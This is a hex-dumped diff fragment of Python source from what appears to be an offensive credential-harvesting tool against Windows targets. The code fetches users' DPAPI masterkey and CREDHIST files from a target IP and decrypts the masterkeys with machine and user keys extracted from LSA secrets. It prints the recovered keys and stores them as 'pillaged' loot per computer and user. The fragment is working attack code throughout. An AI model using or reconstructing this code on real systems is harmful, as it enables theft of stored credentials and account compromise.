+00013500: 5f64 6972 6563 746f 7279 3220 616e 6420  _directory2 and 
+00013510: 6973 5f67 7569 6428 6c6f 6e67 6e61 6d65  is_guid(longname
+00013520: 3229 3a20 2023 2047 5549 440a 0909 0909  2):  # GUID.....
+00013530: 0909 0909 0909 0973 656c 662e 646f 776e  .......self.down
+00013540: 6c6f 6164 5f6d 6173 7465 726b 6579 2875  load_masterkey(u
+00013550: 7365 722c 2074 6d70 5f70 7764 322c 206c  ser, tmp_pwd2, l
+00013560: 6f6e 676e 616d 6532 2c20 7479 7065 3d27  ongname2, type='
+00013570: 5553 4552 2729 0a09 0909 0909 0909 0965  USER').........e
+00013580: 6c69 6620 6973 5f64 6972 6563 746f 7279  lif is_directory
+00013590: 3a0a 0909 0909 0909 0909 0973 656c 662e  :..........self.
+000135a0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+000135b0: 0909 0909 0909 0909 0966 225b 7b73 656c  .........f"[{sel
+000135c0: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+000135d0: 5f69 707d 5d20 466f 756e 6420 4469 7265  _ip}] Found Dire
+000135e0: 6374 6f72 7920 2573 202d 3e20 646f 696e  ctory %s -> doin
+000135f0: 6720 6e6f 7468 696e 6722 2025 206c 6f6e  g nothing" % lon
+00013600: 676e 616d 6529 0a09 0909 0909 0909 0965  gname).........e
+00013610: 6c73 653a 0a09 0909 0909 0909 0909 7365  lse:..........se
+00013620: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00013630: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
+00013640: 732e 7461 7267 6574 5f69 707d 5d20 466f  s.target_ip}] Fo
+00013650: 756e 6420 6669 6c65 2025 7322 2025 206c  und file %s" % l
+00013660: 6f6e 676e 616d 6529 0a09 0909 0909 0909  ongname)........
+00013670: 0909 6966 2022 4352 4544 4849 5354 2220  ..if "CREDHIST" 
+00013680: 696e 206c 6f6e 676e 616d 653a 0a09 0909  in longname:....
+00013690: 0909 0909 0909 0973 656c 662e 646f 776e  .......self.down
+000136a0: 6c6f 6164 5f63 7265 6468 6973 7428 7573  load_credhist(us
+000136b0: 6572 2c20 746d 705f 7077 642c 206c 6f6e  er, tmp_pwd, lon
+000136c0: 676e 616d 652c 2074 7970 653d 2755 5345  gname, type='USE
+000136d0: 5227 290a 0909 0909 0909 6578 6365 7074  R').......except
+000136e0: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
+000136f0: 3a0a 0909 0909 0909 0973 656c 662e 6c6f  :........self.lo
+00013700: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+00013710: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+00013720: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+00013730: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
+00013740: 4e47 7d45 7863 6570 7469 6f6e 2069 6e20  NG}Exception in 
+00013750: 6765 745f 6d61 7374 6572 6b65 7973 2066  get_masterkeys f
+00013760: 6f72 207b 6c6f 6e67 6e61 6d65 7d7b 6263  or {longname}{bc
+00013770: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+00013780: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+00013790: 672e 6465 6275 6728 6578 290a 0909 0909  g.debug(ex).....
+000137a0: 0909 0963 6f6e 7469 6e75 650a 0909 0909  ...continue.....
+000137b0: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
+000137c0: 2061 7320 6578 3a0a 0909 0909 0973 656c   as ex:......sel
+000137d0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+000137e0: 0a09 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
 000137f0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00013800: 707d 5d20 5b2d 5d20 7b62 636f 6c6f 7273  p}] [-] {bcolors
-00013810: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
-00013820: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
-00013830: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
-00013840: 7b67 7569 647d 2061 6c72 6561 6479 2064  {guid} already d
-00013850: 6563 7279 7074 6564 2229 0a09 0909 7265  ecrypted")....re
-00013860: 7475 726e 2075 7365 722e 6d61 7374 6572  turn user.master
-00013870: 6b65 7973 5f66 696c 655b 6775 6964 5d0a  keys_file[guid].
-00013880: 0909 656c 6966 2075 7365 722e 6d61 7374  ..elif user.mast
-00013890: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-000138a0: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
-000138b0: 656e 6372 7970 7465 6427 3a0a 0909 0972  encrypted':....r
-000138c0: 6574 7572 6e20 7365 6c66 2e64 6563 7279  eturn self.decry
-000138d0: 7074 5f6d 6173 7465 726b 6579 2875 7365  pt_masterkey(use
-000138e0: 722c 2067 7569 642c 2074 7970 652c 2074  r, guid, type, t
-000138f0: 6573 7465 645f 7479 7065 3d5b 5d29 0a0a  ested_type=[])..
-00013900: 0964 6566 2064 6563 7279 7074 5f6d 6173  .def decrypt_mas
-00013910: 7465 726b 6579 2873 656c 662c 2075 7365  terkey(self, use
-00013920: 722c 2067 7569 642c 2074 7970 653d 2727  r, guid, type=''
-00013930: 2c20 7465 7374 6564 5f74 7970 653d 5b5d  , tested_type=[]
-00013940: 293a 0a0a 0909 7365 6c66 2e6c 6f67 6769  ):....self.loggi
-00013950: 6e67 2e64 6562 7567 280a 0909 0966 225b  ng.debug(....f"[
-00013960: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-00013970: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
-00013980: 4465 6372 7970 7469 6e67 207b 6263 6f6c  Decrypting {bcol
-00013990: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
-000139a0: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
-000139b0: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
-000139c0: 6579 207b 6775 6964 7d20 6f66 2074 7970  ey {guid} of typ
-000139d0: 6520 7b74 7970 657d 2028 7479 7065 5f76  e {type} (type_v
-000139e0: 616c 6964 6174 6564 3d7b 7573 6572 2e74  alidated={user.t
-000139f0: 7970 655f 7661 6c69 6461 7465 647d 2f75  ype_validated}/u
-00013a00: 7365 722e 7479 7065 3d7b 7573 6572 2e74  ser.type={user.t
-00013a10: 7970 657d 2920 2d20 7465 7374 6564 203a  ype}) - tested :
-00013a20: 207b 7465 7374 6564 5f74 7970 657d 2229   {tested_type}")
-00013a30: 0a09 0967 7569 6420 3d20 6775 6964 2e6c  ...guid = guid.l
-00013a40: 6f77 6572 2829 0a09 0969 6620 6775 6964  ower()...if guid
-00013a50: 206e 6f74 2069 6e20 7573 6572 2e6d 6173   not in user.mas
-00013a60: 7465 726b 6579 735f 6669 6c65 3a0a 0909  terkeys_file:...
-00013a70: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00013a80: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
-00013a90: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00013aa0: 5f69 707d 5d20 5b21 5d20 7b62 636f 6c6f  _ip}] [!] {bcolo
-00013ab0: 7273 2e46 4149 4c7d 7b75 7365 722e 7573  rs.FAIL}{user.us
-00013ac0: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
-00013ad0: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
-00013ae0: 7b67 7569 647d 206e 6f74 2066 6f75 6e64  {guid} not found
-00013af0: 2229 0a09 0909 7265 7475 726e 202d 310a  ")....return -1.
-00013b00: 0909 6c6f 6361 6c66 696c 6520 3d20 7573  ..localfile = us
-00013b10: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
-00013b20: 6c65 5b67 7569 645d 5b27 7061 7468 275d  le[guid]['path']
-00013b30: 0a0a 0909 6966 2075 7365 722e 6d61 7374  ....if user.mast
-00013b40: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-00013b50: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
-00013b60: 6465 6372 7970 7465 6427 3a0a 0909 0973  decrypted':....s
-00013b70: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00013b80: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
-00013b90: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00013ba0: 707d 5d20 5b2d 5d20 7b62 636f 6c6f 7273  p}] [-] {bcolors
-00013bb0: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
-00013bc0: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
-00013bd0: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
-00013be0: 7b67 7569 647d 2061 6c72 6561 6479 2064  {guid} already d
-00013bf0: 6563 7279 7074 6564 2229 0a09 0909 7265  ecrypted")....re
-00013c00: 7475 726e 2075 7365 722e 6d61 7374 6572  turn user.master
-00013c10: 6b65 7973 5f66 696c 655b 6775 6964 5d0a  keys_file[guid].
-00013c20: 0909 656c 7365 3a0a 0909 0923 2069 6620  ..else:....# if 
-00013c30: 7573 6572 2e74 7970 655f 7661 6c69 6461  user.type_valida
-00013c40: 7465 6420 3d3d 2054 7275 653a 0a09 0909  ted == True:....
-00013c50: 2309 7479 7065 3d75 7365 722e 7479 7065  #.type=user.type
-00013c60: 0a09 0909 6966 2074 7970 6520 3d3d 2027  ....if type == '
-00013c70: 273a 0a09 0909 0974 7970 6520 3d20 7573  ':.....type = us
-00013c80: 6572 2e74 7970 650a 0a09 0909 6966 2027  er.type.....if '
-00013c90: 4d41 4348 494e 4527 2069 6e20 7465 7374  MACHINE' in test
-00013ca0: 6564 5f74 7970 6520 616e 6420 274d 4143  ed_type and 'MAC
-00013cb0: 4849 4e45 2d55 5345 5227 2069 6e20 7465  HINE-USER' in te
-00013cc0: 7374 6564 5f74 7970 6520 616e 6420 2744  sted_type and 'D
-00013cd0: 4f4d 4149 4e27 2069 6e20 7465 7374 6564  OMAIN' in tested
-00013ce0: 5f74 7970 6520 616e 6420 274c 4f43 414c  _type and 'LOCAL
-00013cf0: 2720 696e 2074 6573 7465 645f 7479 7065  ' in tested_type
-00013d00: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
-00013d10: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
-00013d20: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-00013d30: 7461 7267 6574 5f69 707d 5d20 5b21 5d20  target_ip}] [!] 
-00013d40: 7b62 636f 6c6f 7273 2e46 4149 4c7d 7b75  {bcolors.FAIL}{u
-00013d50: 7365 722e 7573 6572 6e61 6d65 7d7b 6263  ser.username}{bc
-00013d60: 6f6c 6f72 732e 454e 4443 7d20 6d61 7374  olors.ENDC} mast
-00013d70: 6572 6b65 7920 7b67 7569 647d 203a 2041  erkey {guid} : A
-00013d80: 6c6c 2064 6563 7279 7074 696f 6e20 7479  ll decryption ty
-00013d90: 7065 2066 6169 6c65 6422 290a 0909 0909  pe failed").....
-00013da0: 7265 7475 726e 202d 310a 0a09 0909 6966  return -1.....if
-00013db0: 2074 7970 6520 3d3d 2027 4d41 4348 494e   type == 'MACHIN
-00013dc0: 4527 3a0a 0909 0909 2320 5472 7920 6465  E':.....# Try de
-00013dd0: 2064 6563 7279 7074 206d 6173 7465 726b   decrypt masterk
-00013de0: 6579 2066 696c 650a 0909 0909 666f 7220  ey file.....for 
-00013df0: 6b65 7920 696e 2073 656c 662e 6d61 6368  key in self.mach
-00013e00: 696e 655f 6b65 793a 0a09 0909 0909 7365  ine_key:......se
-00013e10: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00013e20: 280a 0909 0909 0909 6622 5b7b 7365 6c66  (.......f"[{self
-00013e30: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00013e40: 6970 7d5d 205b 2e2e 2e5d 2044 6563 7279  ip}] [...] Decry
-00013e50: 7074 696e 6720 7b62 636f 6c6f 7273 2e4f  pting {bcolors.O
-00013e60: 4b42 4c55 457d 7b75 7365 722e 7573 6572  KBLUE}{user.user
-00013e70: 6e61 6d65 7d7b 6263 6f6c 6f72 732e 454e  name}{bcolors.EN
-00013e80: 4443 7d20 6d61 7374 6572 6b65 7920 7b67  DC} masterkey {g
-00013e90: 7569 647d 2077 6974 6820 4d41 4348 494e  uid} with MACHIN
-00013ea0: 455f 4b65 7920 6672 6f6d 204c 5341 207b  E_Key from LSA {
-00013eb0: 6b65 792e 6465 636f 6465 2827 7574 662d  key.decode('utf-
-00013ec0: 3827 297d 2229 0a09 0909 0909 7472 793a  8')}")......try:
-00013ed0: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
-00013ee0: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
-00013ef0: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
-00013f00: 0909 0909 096d 796f 7074 696f 6e73 2e73  .....myoptions.s
-00013f10: 6964 203d 204e 6f6e 6520 2023 2075 7365  id = None  # use
-00013f20: 722e 7369 640a 0909 0909 0909 6d79 6f70  r.sid.......myop
-00013f30: 7469 6f6e 732e 7573 6572 6e61 6d65 203d  tions.username =
-00013f40: 2075 7365 722e 7573 6572 6e61 6d65 0a09   user.username..
-00013f50: 0909 0909 096d 796f 7074 696f 6e73 2e70  .....myoptions.p
-00013f60: 766b 203d 204e 6f6e 650a 0909 0909 0909  vk = None.......
-00013f70: 6d79 6f70 7469 6f6e 732e 6669 6c65 203d  myoptions.file =
-00013f80: 206c 6f63 616c 6669 6c65 2020 2320 4d61   localfile  # Ma
-00013f90: 7374 6572 6b65 7966 696c 6520 746f 2070  sterkeyfile to p
-00013fa0: 6172 7365 0a09 0909 0909 096d 796f 7074  arse.......myopt
-00013fb0: 696f 6e73 2e6b 6579 203d 206b 6579 2e64  ions.key = key.d
-00013fc0: 6563 6f64 6528 2275 7466 2d38 2229 0a09  ecode("utf-8")..
-00013fd0: 0909 0909 096d 7964 7061 7069 203d 2044  .....mydpapi = D
-00013fe0: 5041 5049 286d 796f 7074 696f 6e73 2c20  PAPI(myoptions, 
-00013ff0: 7365 6c66 2e6c 6f67 6769 6e67 290a 0909  self.logging)...
-00014000: 0909 0909 6465 6372 7970 7465 645f 6d61  ....decrypted_ma
-00014010: 7374 6572 6b65 7920 3d20 6d79 6470 6170  sterkey = mydpap
-00014020: 692e 6465 6372 7970 745f 6d61 7374 6572  i.decrypt_master
-00014030: 6b65 7928 290a 0909 0909 0909 6966 2064  key().......if d
-00014040: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
-00014050: 6579 2021 3d20 4e6f 6e65 2061 6e64 2064  ey != None and d
-00014060: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
-00014070: 6579 2021 3d20 2d31 3a0a 0909 0909 0909  ey != -1:.......
-00014080: 0923 2073 656c 662e 6c6f 6767 696e 672e  .# self.logging.
-00014090: 6465 6275 6728 6622 5b7b 7365 6c66 2e6f  debug(f"[{self.o
-000140a0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-000140b0: 7d5d 207b 6263 6f6c 6f72 732e 4f4b 4752  }] {bcolors.OKGR
-000140c0: 4545 4e7d 5b2e 2e2e 5d20 4d61 7365 726b  EEN}[...] Maserk
-000140d0: 6579 207b 6263 6f6c 6f72 732e 454e 4443  ey {bcolors.ENDC
-000140e0: 7d7b 6c6f 6361 6c66 696c 657d 2020 7b62  }{localfile}  {b
-000140f0: 636f 6c6f 7273 2e45 4e44 437d 3a20 7b64  colors.ENDC}: {d
-00014100: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
-00014110: 6579 7d22 2029 0a09 0909 0909 0909 7573  ey}" )........us
-00014120: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
-00014130: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
-00014140: 275d 203d 2027 6465 6372 7970 7465 6427  '] = 'decrypted'
-00014150: 0a09 0909 0909 0909 7573 6572 2e6d 6173  ........user.mas
-00014160: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
-00014170: 645d 5b27 6b65 7927 5d20 3d20 6465 6372  d]['key'] = decr
-00014180: 7970 7465 645f 6d61 7374 6572 6b65 790a  ypted_masterkey.
-00014190: 0909 0909 0909 0923 2075 7365 722e 6d61  .......# user.ma
-000141a0: 7374 6572 6b65 7973 5b6c 6f63 616c 6669  sterkeys[localfi
-000141b0: 6c65 5d20 3d20 6465 6372 7970 7465 645f  le] = decrypted_
-000141c0: 6d61 7374 6572 6b65 790a 0909 0909 0909  masterkey.......
-000141d0: 0975 7365 722e 7479 7065 203d 2027 4d41  .user.type = 'MA
-000141e0: 4348 494e 4527 0a09 0909 0909 0909 7573  CHINE'........us
-000141f0: 6572 2e74 7970 655f 7661 6c69 6461 7465  er.type_validate
-00014200: 6420 3d20 5472 7565 0a09 0909 0909 0909  d = True........
-00014210: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-00014220: 7567 280a 0909 0909 0909 0909 6622 5b7b  ug(.........f"[{
-00014230: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-00014240: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-00014250: 732e 4f4b 424c 5545 7d44 6563 7279 7074  s.OKBLUE}Decrypt
-00014260: 696f 6e20 7375 6363 6573 7366 756c 6c20  ion successfull 
-00014270: 7b62 636f 6c6f 7273 2e45 4e44 437d 206f  {bcolors.ENDC} o
-00014280: 6620 4d61 7374 6572 6b65 7920 7b67 7569  f Masterkey {gui
-00014290: 647d 2066 6f72 204d 6163 6869 6e65 207b  d} for Machine {
-000142a0: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
-000142b0: 207b 7573 6572 2e75 7365 726e 616d 657d   {user.username}
-000142c0: 7b62 636f 6c6f 7273 2e45 4e44 437d 2020  {bcolors.ENDC}  
-000142d0: 5c6e 4b65 793a 207b 6465 6372 7970 7465  \nKey: {decrypte
-000142e0: 645f 6d61 7374 6572 6b65 797d 2229 0a09  d_masterkey}")..
-000142f0: 0909 0909 0909 7365 6c66 2e64 622e 7570  ......self.db.up
-00014300: 6461 7465 5f6d 6173 7465 726b 6579 2866  date_masterkey(f
-00014310: 696c 655f 7061 7468 3d75 7365 722e 6d61  ile_path=user.ma
-00014320: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
-00014330: 6964 5d5b 2770 6174 6827 5d2c 2067 7569  id]['path'], gui
-00014340: 643d 6775 6964 2c0a 0909 0909 0909 0909  d=guid,.........
-00014350: 0909 0909 0920 7374 6174 7573 3d75 7365  ..... status=use
-00014360: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
-00014370: 655b 6775 6964 5d5b 2773 7461 7475 7327  e[guid]['status'
-00014380: 5d2c 0a09 0909 0909 0909 0909 0909 0909  ],..............
-00014390: 2064 6563 7279 7074 6564 5f77 6974 683d   decrypted_with=
-000143a0: 224d 4143 4849 4e45 2d4b 4559 222c 2064  "MACHINE-KEY", d
-000143b0: 6563 7279 7074 6564 5f76 616c 7565 3d64  ecrypted_value=d
-000143c0: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
-000143d0: 6579 2c0a 0909 0909 0909 0909 0909 0909  ey,.............
-000143e0: 0920 7069 6c6c 6167 6564 5f66 726f 6d5f  . pillaged_from_
-000143f0: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
-00014400: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00014410: 6970 2c0a 0909 0909 0909 0909 0909 0909  ip,.............
-00014420: 0920 7069 6c6c 6167 6564 5f66 726f 6d5f  . pillaged_from_
-00014430: 7573 6572 6e61 6d65 3d75 7365 722e 7573  username=user.us
-00014440: 6572 6e61 6d65 290a 0909 0909 0909 0972  ername)........r
-00014450: 6574 7572 6e20 7573 6572 2e6d 6173 7465  eturn user.maste
-00014460: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
-00014470: 0a09 0909 0909 0965 6c73 653a 0a09 0909  .......else:....
-00014480: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00014490: 2e64 6562 7567 280a 0909 0909 0909 0909  .debug(.........
-000144a0: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
-000144b0: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
-000144c0: 6f6c 6f72 732e 5741 524e 494e 477d 204d  olors.WARNING} M
-000144d0: 4143 4849 4e45 2d4b 6579 2066 726f 6d20  ACHINE-Key from 
-000144e0: 4c53 4120 7b6b 6579 2e64 6563 6f64 6528  LSA {key.decode(
-000144f0: 2775 7466 2d38 2729 7d20 6361 6e27 7420  'utf-8')} can't 
-00014500: 6465 636f 6465 207b 6263 6f6c 6f72 732e  decode {bcolors.
-00014510: 4f4b 424c 5545 7d7b 7573 6572 2e75 7365  OKBLUE}{user.use
-00014520: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
-00014530: 4e44 437d 204d 6173 7465 726b 6579 207b  NDC} Masterkey {
-00014540: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
-00014550: 4443 7d22 290a 0909 0909 0965 7863 6570  DC}")......excep
-00014560: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-00014570: 783a 0a09 0909 0909 0973 656c 662e 6c6f  x:.......self.lo
-00014580: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00014590: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-000145a0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-000145b0: 2045 7863 6570 7469 6f6e 207b 6263 6f6c   Exception {bcol
-000145c0: 6f72 732e 5741 524e 494e 477d 204d 4143  ors.WARNING} MAC
-000145d0: 4849 4e45 2d4b 6579 2066 726f 6d20 4c53  HINE-Key from LS
-000145e0: 4120 7b6b 6579 2e64 6563 6f64 6528 2775  A {key.decode('u
-000145f0: 7466 2d38 2729 7d20 6361 6e27 7420 6465  tf-8')} can't de
-00014600: 636f 6465 207b 6263 6f6c 6f72 732e 4f4b  code {bcolors.OK
-00014610: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
-00014620: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
-00014630: 437d 204d 6173 7465 726b 6579 207b 6775  C} Masterkey {gu
-00014640: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
-00014650: 7d22 290a 0909 0909 0909 7365 6c66 2e6c  }").......self.l
-00014660: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
-00014670: 0a09 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-00014680: 2320 6966 2075 7365 722e 7479 7065 5f76  # if user.type_v
-00014690: 616c 6964 6174 6564 203d 3d20 4661 6c73  alidated == Fals
-000146a0: 653a 0a09 0909 0909 7465 7374 6564 5f74  e:......tested_t
-000146b0: 7970 652e 6170 7065 6e64 2827 4d41 4348  ype.append('MACH
-000146c0: 494e 4527 290a 0909 0909 0973 656c 662e  INE')......self.
-000146d0: 6465 6372 7970 745f 6d61 7374 6572 6b65  decrypt_masterke
-000146e0: 7928 7573 6572 2c20 6775 6964 2c20 7479  y(user, guid, ty
-000146f0: 7065 3d27 4d41 4348 494e 452d 5553 4552  pe='MACHINE-USER
-00014700: 272c 2074 6573 7465 645f 7479 7065 3d74  ', tested_type=t
-00014710: 6573 7465 645f 7479 7065 290a 0909 0965  ested_type)....e
-00014720: 6c69 6620 7479 7065 203d 3d20 274d 4143  lif type == 'MAC
-00014730: 4849 4e45 2d55 5345 5227 3a0a 0909 0909  HINE-USER':.....
-00014740: 2320 5472 7920 6465 2064 6563 7279 7074  # Try de decrypt
-00014750: 206d 6173 7465 726b 6579 2066 696c 650a   masterkey file.
-00014760: 0909 0909 666f 7220 6b65 7920 696e 2073  ....for key in s
-00014770: 656c 662e 7573 6572 5f6b 6579 3a0a 0909  elf.user_key:...
-00014780: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00014790: 6465 6275 6728 0a09 0909 0909 0966 225b  debug(.......f"[
-000147a0: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-000147b0: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
-000147c0: 4465 6372 7970 7469 6e67 207b 6263 6f6c  Decrypting {bcol
-000147d0: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
-000147e0: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
-000147f0: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
-00014800: 6579 207b 6775 6964 7d20 7769 7468 204d  ey {guid} with M
-00014810: 4143 4849 4e45 2d55 5345 525f 4b65 7920  ACHINE-USER_Key 
-00014820: 6672 6f6d 204c 5341 207b 6b65 792e 6465  from LSA {key.de
-00014830: 636f 6465 2827 7574 662d 3827 297d 2229  code('utf-8')}")
-00014840: 2020 2320 616e 6420 5349 4420 2573 202c    # and SID %s ,
-00014850: 2075 7365 722e 7369 6420 2929 0a09 0909   user.sid ))....
-00014860: 0909 7472 793a 0a09 0909 0909 0923 206b  ..try:.......# k
-00014870: 6579 312c 206b 6579 3220 3d20 6465 7269  ey1, key2 = deri
-00014880: 7665 4b65 7973 4672 6f6d 5573 6572 6b65  veKeysFromUserke
-00014890: 7928 7473 6964 2c20 7573 6572 6b65 7929  y(tsid, userkey)
-000148a0: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
-000148b0: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
-000148c0: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
-000148d0: 0909 0909 096d 796f 7074 696f 6e73 2e66  .....myoptions.f
-000148e0: 696c 6520 3d20 6c6f 6361 6c66 696c 6520  ile = localfile 
-000148f0: 2023 204d 6173 7465 726b 6579 6669 6c65   # Masterkeyfile
-00014900: 2074 6f20 7061 7273 650a 0909 0909 0909   to parse.......
-00014910: 6966 2075 7365 722e 6973 5f61 6463 6f6e  if user.is_adcon
-00014920: 6e65 6374 2069 7320 5472 7565 3a0a 0909  nect is True:...
-00014930: 0909 0909 096d 796f 7074 696f 6e73 2e6b  .....myoptions.k
-00014940: 6579 203d 206b 6579 2e64 6563 6f64 6528  ey = key.decode(
-00014950: 2275 7466 2d38 2229 0a09 0909 0909 0909  "utf-8")........
-00014960: 6d79 6f70 7469 6f6e 732e 7369 6420 3d20  myoptions.sid = 
-00014970: 7573 6572 2e73 6964 0a09 0909 0909 0965  user.sid.......e
-00014980: 6c73 653a 0a09 0909 0909 0909 6d79 6f70  lse:........myop
-00014990: 7469 6f6e 732e 6b65 7920 3d20 6b65 792e  tions.key = key.
-000149a0: 6465 636f 6465 2822 7574 662d 3822 2920  decode("utf-8") 
-000149b0: 2023 204e 6f6e 650a 0909 0909 0909 096d   # None........m
-000149c0: 796f 7074 696f 6e73 2e73 6964 203d 204e  yoptions.sid = N
-000149d0: 6f6e 6520 2023 2075 7365 722e 7369 640a  one  # user.sid.
-000149e0: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
-000149f0: 2e75 7365 726e 616d 6520 3d20 7573 6572  .username = user
-00014a00: 2e75 7365 726e 616d 650a 0909 0909 0909  .username.......
-00014a10: 6d79 6f70 7469 6f6e 732e 7076 6b20 3d20  myoptions.pvk = 
-00014a20: 4e6f 6e65 0a09 0909 0909 096d 7964 7061  None.......mydpa
-00014a30: 7069 203d 2044 5041 5049 286d 796f 7074  pi = DPAPI(myopt
-00014a40: 696f 6e73 2c20 7365 6c66 2e6c 6f67 6769  ions, self.loggi
-00014a50: 6e67 290a 0909 0909 0909 6465 6372 7970  ng).......decryp
-00014a60: 7465 645f 6d61 7374 6572 6b65 7920 3d20  ted_masterkey = 
-00014a70: 6d79 6470 6170 692e 6465 6372 7970 745f  mydpapi.decrypt_
-00014a80: 6d61 7374 6572 6b65 7928 290a 0909 0909  masterkey().....
-00014a90: 0909 6966 2064 6563 7279 7074 6564 5f6d  ..if decrypted_m
-00014aa0: 6173 7465 726b 6579 2021 3d20 2d31 2061  asterkey != -1 a
-00014ab0: 6e64 2064 6563 7279 7074 6564 5f6d 6173  nd decrypted_mas
-00014ac0: 7465 726b 6579 2021 3d20 4e6f 6e65 3a0a  terkey != None:.
-00014ad0: 0909 0909 0909 0923 2073 656c 662e 6c6f  .......# self.lo
-00014ae0: 6767 696e 672e 6465 6275 6728 6622 5b7b  gging.debug(f"[{
-00014af0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
